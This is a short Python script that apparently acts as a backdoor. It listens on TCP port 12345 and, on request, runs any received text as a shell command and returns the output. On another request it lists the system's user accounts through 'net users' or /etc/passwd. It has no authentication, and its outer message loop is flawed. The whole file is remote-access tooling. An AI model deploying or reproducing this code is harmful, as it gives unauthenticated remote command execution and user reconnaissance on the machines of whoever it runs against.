import socket
from subprocess import Popen, PIPE
import platform



class Shell:
    command = ""
    next_command = True

    def receive(self):
        self.command = distant_socket.recv(4096).decode("utf-8")

    def execute_command(self):
        self.result = Popen(self.command, shell=True, stdout=PIPE)
        self.response = self.result.communicate()

    def send(self):
        self.response = self.response[0]
        self.response = self.response.decode("utf-8")
        self.response = self.response + " "
        self.response = self.response.encode("utf-8")
        distant_socket.send(self.response)


class GetInfo:
    users = ""


    def get_users(self):

        if platform.system() == "Windows":
            self.users = Popen("net users", shell=True, stdout=PIPE)
            self.response = self.users.communicate()
        elif platform.system() == "Linux":
            self.users = Popen("cut -d: -f1 /etc/passwd", shell=True, stdout=PIPE)
            self.response = self.users.communicate()

        self.send()

    def send(self):
        self.response = self.response[0]
        self.response = self.response.decode("utf-8")
        self.response = self.response + " "
        self.response = self.response.encode("utf-8")
        distant_socket.send(self.response)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
host_ip = socket.gethostbyname(host)
s.bind((host_ip, 12345))
s.listen(5)
distant_socket, addr = s.accept()
distant_socket.send("Welcome".encode("utf-8"))
message = distant_socket.recv(4096).decode("utf-8")
while message != "exit":
    if message == "1":
        shell = Shell()
        while shell.next_command:
            if shell.command == "exit":
                shell.next_command = False
            else:
                shell.receive()
                shell.execute_command()
                shell.send()
    elif message == "2":
        getinfo = GetInfo()
        getinfo.get_users()

s.close()
